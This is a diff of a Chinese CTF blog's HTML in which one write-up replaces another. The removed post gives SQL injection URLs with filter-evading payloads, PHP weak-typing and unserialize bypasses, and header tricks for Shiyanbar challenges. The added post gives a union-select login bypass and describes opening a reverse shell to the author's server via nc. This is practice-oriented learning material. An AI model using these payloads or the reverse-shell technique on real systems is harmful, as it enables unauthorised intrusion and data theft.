@@ -79,19 +79,23 @@
 
 
 
-<meta name="description" content="WEB实验吧-CTF-简单的sql注入思路这个题过滤的真的是太多了。。。看了wp才搞出来的先单引号判断。存在注入暴库http://ctf5.shiyanbar.com/423/web/?id=11&amp;#39;or updatexml(1,concat(‘0x7e’,(/!select/ /!database()/ /!from/ flag  LIMIT 0,1),’0x7e’),1) or ‘1’=">
+<meta name="description" content="题目链接http://118.89.219.210:49165/ 题解 首先进入题是一个登陆界面试了试普通的注入，没什么反应。。然后抓了包，看到头信息里有一段base64加密后的tip。解密后123$sql=&amp;quot;SELECT username,password FROM admin WHERE username=&amp;apos;&amp;quot;.$username.&amp;quot;&amp;apos;&amp;quo">
 <meta property="og:type" content="article">
-<meta property="og:title" content="实验吧WP">
-<meta property="og:url" content="http://yoursite.com/2018/04/23/实验吧/index.html">
+<meta property="og:title" content="bugku一道题目的学习">
+<meta property="og:url" content="http://yoursite.com/2018/04/27/bugku一道题目/index.html">
 <meta property="og:site_name" content="Hu3sky">
-<meta property="og:description" content="WEB实验吧-CTF-简单的sql注入思路这个题过滤的真的是太多了。。。看了wp才搞出来的先单引号判断。存在注入暴库http://ctf5.shiyanbar.com/423/web/?id=11&amp;#39;or updatexml(1,concat(‘0x7e’,(/!select/ /!database()/ /!from/ flag  LIMIT 0,1),’0x7e’),1) or ‘1’=">
+<meta property="og:description" content="题目链接http://118.89.219.210:49165/ 题解 首先进入题是一个登陆界面试了试普通的注入，没什么反应。。然后抓了包，看到头信息里有一段base64加密后的tip。解密后123$sql=&amp;quot;SELECT username,password FROM admin WHERE username=&amp;apos;&amp;quot;.$username.&amp;quot;&amp;apos;&amp;quo">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/ctf/form.png">
-<meta property="og:updated_time" content="2018-04-26T14:34:46.435Z">
+<meta property="og:image" content="http://yoursite.com/ctf/bugku1.png">
+<meta property="og:image" content="http://yoursite.com/ctf/bugku2.png">
+<meta property="og:image" content="http://yoursite.com/ctf/bugku3.png">
+<meta property="og:image" content="http://yoursite.com/ctf/bugku4.png">
+<meta property="og:image" content="http://yoursite.com/ctf/bugku5.png">
+<meta property="og:updated_time" content="2018-04-27T11:42:02.457Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="实验吧WP">
-<meta name="twitter:description" content="WEB实验吧-CTF-简单的sql注入思路这个题过滤的真的是太多了。。。看了wp才搞出来的先单引号判断。存在注入暴库http://ctf5.shiyanbar.com/423/web/?id=11&amp;#39;or updatexml(1,concat(‘0x7e’,(/!select/ /!database()/ /!from/ flag  LIMIT 0,1),’0x7e’),1) or ‘1’=">
-<meta name="twitter:image" content="http://yoursite.com/ctf/form.png">
+<meta name="twitter:title" content="bugku一道题目的学习">
+<meta name="twitter:description" content="题目链接http://118.89.219.210:49165/ 题解 首先进入题是一个登陆界面试了试普通的注入，没什么反应。。然后抓了包，看到头信息里有一段base64加密后的tip。解密后123$sql=&amp;quot;SELECT username,password FROM admin WHERE username=&amp;apos;&amp;quot;.$username.&amp;quot;&amp;apos;&amp;quo">
+<meta name="twitter:image" content="http://yoursite.com/ctf/bugku1.png">
 
 
 
@@ -121,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/04/23/实验吧/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/04/27/bugku一道题目/"/>
 
 
 
 
 
-  <title>实验吧WP | Hu3sky</title>
+  <title>bugku一道题目的学习 | Hu3sky</title>
   
 
 
@@ -265,7 +269,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/实验吧/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/27/bugku一道题目/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Hu3sky">
@@ -282,7 +286,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">实验吧WP</h1>
+          <h1 class="post-title" itemprop="name headline">bugku一道题目的学习</h1>
         
 
         <div class="post-meta">
@@ -294,8 +298,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-23T23:15:09+08:00">
-                2018-04-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-27T00:00:00+08:00">
+                2018-04-27
               </time>
             
 
@@ -354,22 +358,12 @@
       
 
       
-        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="实验吧-CTF-简单的sql注入思路"><a href="#实验吧-CTF-简单的sql注入思路" class="headerlink" title="实验吧-CTF-简单的sql注入思路"></a>实验吧-CTF-简单的sql注入思路</h2><p>这个题过滤的真的是太多了。。。看了wp才搞出来的<br>先单引号判断。存在注入<br>暴库<br><a href="http://ctf5.shiyanbar.com/423/web/?id=11&#39;or" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/?id=11&#39;or</a> updatexml(1,concat(‘0x7e’,(/<em>!select</em>/ /<em>!database()</em>/ /<em>!from</em>/ flag  LIMIT 0,1),’0x7e’),1) or ‘1’=’1<br>爆表<br><a href="http://ctf5.shiyanbar.com/423/web/?id=11&#39;or" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/?id=11&#39;or</a> updatexml(1,concat(‘0x7e’,(/<em>!select</em>/  table_name  /<em>!from</em>/ information_schema.tables /<em>!where</em>/ /<em>!ttable_schemaable_schema</em>/ = ‘web1’ LIMIT 0,1),’0x7e’),1) or ‘1’=’1 </p>
-<p>查字段<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1%27%20or%20(updatexml(1,concat(0x7e,(/<em>!select</em>/%20colucolumn_namemn_name%20/<em>!from</em>/%20infoinformation_schema.columnsrmation_schema.columns%20/<em>!where</em>/%20table_name=%27flag%27 limit 0,1),0x7e),1))%20or%20%271%27=%271</p>
-<p>查flag<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1%27%20or%20(updatexml(1,concat(0x7e,(/<em>!select</em>/ flag /<em>!from</em>/ <code>flag</code> limit 0,1),0x7e),1))%20or%20%271%27=%271</p>
-<p>这里顺便说一下南邮CTF一道题。题目链接 <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a><br>这道题是一道宽字节注入。因为单引号被转义了。所以在爆字段的时候需要用到16进制，例如<code>where table_name=0x637466</code></p>
-<h2 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h2><p>抓包在header看到了一串base64加密的东西，解码 是要求你post的key，但每次要改变。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests as rq</span><br><span class="line">import base64</span><br><span class="line">url = &quot;http://ctf5.shiyanbar.com/web/10/10.php&quot;</span><br><span class="line">headers = rq.get(url).headers</span><br><span class="line">key = base64.b64decode(headers[&apos;FLAG&apos;]).decode().split(&apos;:&apos;)[1]</span><br><span class="line">post = &#123;&apos;key&apos;:key&#125;</span><br><span class="line">s = rq.post(url,data=post)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure></p>
-<h2 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h2><p>一开始以为是一个爆破。。。都准备写脚本了。<br>结果抓了个包，发现有两个post参数，一个就是PIN，另一个showsource=0，奇怪，然后把0改为1，居然出现源码了。。这下就很简单了啊<br><img src="/ctf/form.png" alt="form"></p>
-<h2 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h2><p>先是右键查看源码，有这样一段说明<br><!-- $test=$_GET['username']; $test=md5($test); if($test=='0') --><br>这里需要用到php弱类型比较，所以我传一个md5后为0的字符串 s878926199a ，这个网上有很多的。之后，返回一个<code>/user.php?fame=hjkleffifer</code>，跟进去。出现页面这样一个页面<code>$unserialize_str = $_POST[&#39;password&#39;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]==&#39;???&#39;) { print_r($flag); } 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</code><br>可以看到是需要将pass和user反序列化都等于某一个值的时候，得到flag。但是，并不知道这个值是多少。他有提示 成也布尔，败也布尔，所以这里要用布尔值来绕过，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度），构造password的值为 <code>a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;}</code> </p>
-<h2 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h2><p>直接扔sqlmap。得到k0y</p>
-<h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p>这道题是目录截断，之前也没见过这样的题，在这里学习了一波新姿势<br><a href="https://blog.csdn.net/wy_97/article/details/76549405" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/76549405</a></p>
-<h2 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h2><p>代码审计。直接看源码。需要访问的ip是1.1.1.1。所以直接改XFF头。get flag。</p>
-<h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><p>根据题意。改user-agent，一开始我将这句话 Make sure you are in the region of England理解为需要我的ip是England。半天没搞出来。。结果看了wp，直接把<code>Accept-Language</code>改为<code>en-gb</code>就好了。然后改user-agent为<code>Mozilla/5.0;.NET CLR 9.9</code></p>
-<h2 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h2><p>抓包。header里有Content-Row: MTUyNDU2OTk1NA==。。直接post。。。得到key</p>
-<h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><p>传递数组绕过ereg().得到flag</p>
-<h2 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h2><p>抓包 清楚Session就行了。</p>
-<h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><p><a href="http://ctf5.shiyanbar.com/web/false.php?name[]=1&amp;password[]=s878926199a" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/false.php?name[]=1&amp;password[]=s878926199a</a></p>
-<p>##</p>
+        <h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a href="http://118.89.219.210:49165/" target="_blank" rel="noopener">http://118.89.219.210:49165/</a></p>
+<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><ul>
+<li>首先进入题是一个登陆界面<img src="/ctf/bugku1.png" alt="bugku">试了试普通的注入，没什么反应。。然后抓了包，看到头信息里有一段base64加密后的tip。解密后<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;;</span><br><span class="line">if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>看了wp，用的是猜测的登陆机制。。<br>post构造<code>username=&#39; union select md5(1),md5(1)#&amp;password=1</code><br>进入了一个这样的界面<img src="/ctf/bugku2.png" alt="bugku"><br>然后接下来的就是一个反弹shell的操作了。。学习了一波<br>首先在自己的服务器上用nc命令，打开对8080端口的监听<br><img src="/ctf/bugku3.png" alt="bugku"><br>我这里在我的vps上打开了8080端口的监听。可以看到bash处，已经可以开始输入命令了，接着我们查看当前目录下有那些文件<br><img src="/ctf/bugku4.png" alt="bugku"><br>用ls命令进行查看。可以看到一个flag的文件，然后直接用cat命令<br><img src="/ctf/bugku5.png" alt="bugku"><br>得到flag~</p>
 
       
     </div>
@@ -394,8 +388,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/23/i春秋/" rel="next" title="i春秋WP">
-                <i class="fa fa-chevron-left"></i> i春秋WP
+              <a href="/2018/04/23/实验吧/" rel="next" title="实验吧WP">
+                <i class="fa fa-chevron-left"></i> 实验吧WP
               </a>
             
           </div>
@@ -403,10 +397,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/04/27/bugku一道题目/" rel="prev" title="bugku一道题目的学习">
-                bugku一道题目的学习 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -533,7 +523,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验吧-CTF-简单的sql注入思路"><span class="nav-number">1.1.</span> <span class="nav-text">实验吧-CTF-简单的sql注入思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#天下武功唯快不破"><span class="nav-number">1.2.</span> <span class="nav-text">天下武功唯快不破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forms"><span class="nav-number">1.3.</span> <span class="nav-text">Forms</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#天网管理系统"><span class="nav-number">1.4.</span> <span class="nav-text">天网管理系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这个看起来有点简单"><span class="nav-number">1.5.</span> <span class="nav-text">这个看起来有点简单!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传绕过"><span class="nav-number">1.6.</span> <span class="nav-text">上传绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#貌似有点难"><span class="nav-number">1.7.</span> <span class="nav-text">貌似有点难</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#头有点大"><span class="nav-number">1.8.</span> <span class="nav-text">头有点大</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#猫抓老鼠"><span class="nav-number">1.9.</span> <span class="nav-text">猫抓老鼠</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Once-More"><span class="nav-number">1.10.</span> <span class="nav-text">Once More</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Guess-Next-Session"><span class="nav-number">1.11.</span> <span class="nav-text">Guess Next Session</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FALSE"><span class="nav-number">1.12.</span> <span class="nav-text">FALSE</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目链接"><span class="nav-number">1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题解"><span class="nav-number">2.</span> <span class="nav-text">题解</span></a></li></ol></div>
             
 
           </div>
